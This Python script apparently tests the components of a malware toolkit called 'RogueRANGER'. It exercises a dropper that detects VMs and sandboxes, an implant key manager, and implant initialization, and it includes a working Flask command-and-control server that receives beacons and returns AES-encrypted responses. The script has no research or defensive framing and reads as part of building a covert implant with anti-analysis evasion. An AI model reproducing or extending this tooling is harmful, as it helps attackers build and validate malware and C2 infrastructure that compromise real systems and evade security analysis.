#!/usr/bin/env python3
"""
Phase 1 End-to-End Test
Tests the complete workflow:
1. Dropper environment analysis
2. Key generation and encryption
3. C2 server with Phase 1 support
4. Enhanced implant beaconing
5. Command execution and results
"""

import subprocess
import sys
import os
import time
import json
import base64
from Cryptodome.Cipher import AES
import threading
from flask import Flask, request, jsonify
import requests
import tempfile

# === Test Configuration ===
TEST_PORT = 5555  # Different port to avoid conflicts
TEST_SECRET_KEY = b'TEST_KEY_1234567890'

# === Helper Functions ===
def run_cmd(cmd, capture=True):
    """Run shell command"""
    print(f"[RUN] {cmd}")
    if capture:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        return result.returncode, result.stdout, result.stderr
    else:
        return subprocess.run(cmd, shell=True)

def test_vm_detector():
    """Test VM detection component"""
    print("\n=== Testing VM Detector ===")
    
    # Import and test
    sys.path.append('.')
    try:
        from vm_detector import VMSandboxDetector
        
        detector = VMSandboxDetector()
        print(f"✓ VM Detector imported successfully")
        
        # Run detection
        result = detector.is_sandboxed()
        print(f"✓ Sandbox detection: {result}")
        
        # Get detailed analysis
        analysis = detector.analyze_environment()
        print(f"✓ Environment analysis complete")
        print(f"  Confidence score: {analysis.get('confidence_score', 0)}")
        print(f"  VM detected: {analysis.get('is_vm', False)}")
        print(f"  Sandbox detected: {analysis.get('is_sandbox', False)}")
        
        return True
    except Exception as e:
        print(f"✗ VM Detector test failed: {e}")
        return False

def test_key_manager():
    """Test KeyManager component"""
    print("\n=== Testing KeyManager ===")
    
    try:
        # Check if key_manager.py exists
        if not os.path.exists('key_manager.py'):
            print("✗ key_manager.py not found")
            return False
        
        # Test import and basic functionality
        from key_manager import KeyManager
        
        km = KeyManager('test_implant')
        print(f"✓ KeyManager imported successfully")
        print(f"  Implant ID: {km.implant_id}")
        print(f"  Implant Hash: {km.implant_hash}")
        
        # Test key generation
        master_key = km.get_master_key()
        print(f"✓ Master key generated: {len(master_key)} bytes")
        
        # Test encryption/decryption
        test_data = b"Test message for encryption"
        encrypted = km.encrypt_with_master(test_data)
        decrypted = km.decrypt_with_master(encrypted)
        
        if decrypted == test_data:
            print(f"✓ Encryption/decryption working")
        else:
            print(f"✗ Encryption/decryption failed")
            return False
        
        return True
    except Exception as e:
        print(f"✗ KeyManager test failed: {e}")
        return False

def test_dropper():
    """Test dropper component"""
    print("\n=== Testing Dropper ===")
    
    try:
        from dropper import Stage1Dropper
        
        dropper = Stage1Dropper()
        print(f"✓ Dropper imported successfully")
        
        # Test environment check (should pass in test environment)
        env_ok = dropper.check_environment()
        print(f"✓ Environment check: {'PASS' if env_ok else 'FAIL'}")
        
        # Test VM detection integration
        vm_detected = dropper.detector.is_sandboxed()
        print(f"✓ VM detection integrated: {vm_detected}")
        
        # Test key derivation
        fingerprint = dropper._generate_system_fingerprint()
        print(f"✓ System fingerprint: {fingerprint[:32]}...")
        
        return True
    except Exception as e:
        print(f"✗ Dropper test failed: {e}")
        return False

def start_test_c2_server():
    """Start a test C2 server"""
    print("\n=== Starting Test C2 Server ===")
    
    # Create a simple test server
    app = Flask(__name__)
    
    received_beacons = []
    pending_commands = {}
    
    @app.route('/', methods=['POST'])
    def beacon_endpoint():
        """Handle beacons"""
        try:
            data = request.get_data()
            
            # Try to parse as JSON (Phase 1)
            try:
                data_str = data.decode('utf-8')
                beacon_data = json.loads(data_str)
                beacon_type = 'phase1'
            except:
                # Try legacy decryption
                try:
                    cipher = AES.new(TEST_SECRET_KEY, AES.MODE_EAX)
                    # Mock decryption for test
                    beacon_type = 'legacy'
                    beacon_data = {'type': 'legacy', 'data': data.hex()[:20]}
                except:
                    beacon_type = 'unknown'
                    beacon_data = {'error': 'decryption_failed'}
            
            # Store beacon
            beacon_record = {
                'type': beacon_type,
                'data': beacon_data,
                'timestamp': time.time(),
                'ip': request.remote_addr
            }
            received_beacons.append(beacon_record)
            
            print(f"  [C2] Received {beacon_type} beacon from {request.remote_addr}")
            
            # Return test response
            response = {
                'commands': [],
                'message': 'Test C2 server response',
                'timestamp': time.time()
            }
            
            # Encrypt response
            cipher = AES.new(TEST_SECRET_KEY, AES.MODE_EAX)
            ciphertext, tag = cipher.encrypt_and_digest(json.dumps(response).encode())
            encrypted = base64.b64encode(cipher.nonce + tag + ciphertext)
            
            return encrypted, 200
            
        except Exception as e:
            print(f"  [C2] Error: {e}")
            return "Error", 500
    
    @app.route('/test', methods=['GET'])
    def test_endpoint():
        """Test endpoint"""
        return jsonify({
            'status': 'online',
            'beacons_received': len(received_beacons),
            'port': TEST_PORT
        })
    
    # Run server in background thread
    import threading
    server_thread = threading.Thread(
        target=lambda: app.run(host='127.0.0.1', port=TEST_PORT, debug=False, threaded=True, use_reloader=False)
    )
    server_thread.daemon = True
    server_thread.start()
    
    # Wait for server to start
    time.sleep(2)
    
    # Test server is up
    try:
        response = requests.get(f'http://127.0.0.1:{TEST_PORT}/test', timeout=2)
        if response.status_code == 200:
            print(f"✓ Test C2 server started on port {TEST_PORT}")
            return True, received_beacons
    except:
        pass
    
    print(f"✗ Failed to start test C2 server")
    return False, []

def test_enhanced_implant():
    """Test the enhanced implant"""
    print("\n=== Testing Enhanced Implant ===")
    
    try:
        # Create a test config
        test_config = {
            'C2_HOST': '127.0.0.1',
            'C2_PORT': TEST_PORT,
            'SECRET_KEY': TEST_SECRET_KEY,
            'use_phase1': True,
            'test_mode': True
        }
        
        # Save config to temp file
        import tempfile
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            json.dump(test_config, f)
            config_file = f.name
        
        # Test implant initialization
        cmd = f"python3 -c \"import sys; sys.path.append('.'); from rogue_implant_phase1 import RogueImplant; import json; config = json.load(open('{config_file}')); implant = RogueImplant(config); print(f'IMPLANT_ID:{{implant.implant_id}}')\""
        
        returncode, stdout, stderr = run_cmd(cmd)
        
        if returncode == 0 and 'IMPLANT_ID:' in stdout:
            implant_id = stdout.split('IMPLANT_ID:')[1].strip()
            print(f"✓ Enhanced implant initialized")
            print(f"  Implant ID: {implant_id}")
            
            # Clean up
            os.unlink(config_file)
            return True
        else:
            print(f"✗ Implant initialization failed")
            print(f"  stdout: {stdout}")
            print(f"  stderr: {stderr}")
            return False
            
    except Exception as e:
        print(f"✗ Enhanced implant test failed: {e}")
        return False

def test_phase1_workflow():
    """Test complete Phase 1 workflow"""
    print("\n=== Testing Complete Phase 1 Workflow ===")
    
    # Start test C2 server
    c2_ok, beacons = start_test_c2_server()
    if not c2_ok:
        return False
    
    # Test components
    tests = [
        ("VM Detector", test_vm_detector),
        ("KeyManager", test_key_manager),
        ("Dropper", test_dropper),
        ("Enhanced Implant", test_enhanced_implant),
    ]
    
    results = []
    for name, test_func in tests:
        try:
            success = test_func()
            results.append((name, success))
            time.sleep(0.5)  # Brief pause between tests
        except Exception as e:
            print(f"✗ {name} test exception: {e}")
            results.append((name, False))
    
    # Summary
    print("\n" + "="*50)
    print("PHASE 1 END-TO-END TEST RESULTS")
    print("="*50)
    
    all_passed = True
    for name, success in results:
        status = "✓ PASS" if success else "✗ FAIL"
        print(f"{name:20} {status}")
        if not success:
            all_passed = False
    
    print(f"\nTest C2 server: {'✓ ONLINE' if c2_ok else '✗ OFFLINE'}")
    print(f"Beacons received: {len(beacons)}")
    
    if all_passed:
        print("\n✅ ALL TESTS PASSED - Phase 1 system is functional!")
        return True
    else:
        print("\n❌ SOME TESTS FAILED - Check individual components")
        return False

def cleanup():
    """Cleanup test artifacts"""
    print("\n=== Cleaning up ===")
    
    # Remove test database if it exists
    if os.path.exists('implants.db'):
        try:
            os.remove('implants.db')
            print("✓ Removed test database")
        except:
            pass
    
    # Kill any test servers (they should auto-exit as daemon threads)
    print("✓ Test cleanup complete")

# === Main ===
if __name__ == "__main__":
    print("🚀 RogueRANGER Phase 1 End-to-End Test")
    print("="*50)
    
    try:
        # Run the complete test
        success = test_phase1_workflow()
        
        # Cleanup
        cleanup()
        
        # Exit with appropriate code
        sys.exit(0 if success else 1)
        
    except KeyboardInterrupt:
        print("\n⚠️ Test interrupted by user")
        cleanup()
        sys.exit(1)
    except Exception as e:
        print(f"\n❌ Test failed with exception: {e}")
        cleanup()
        sys.exit(1)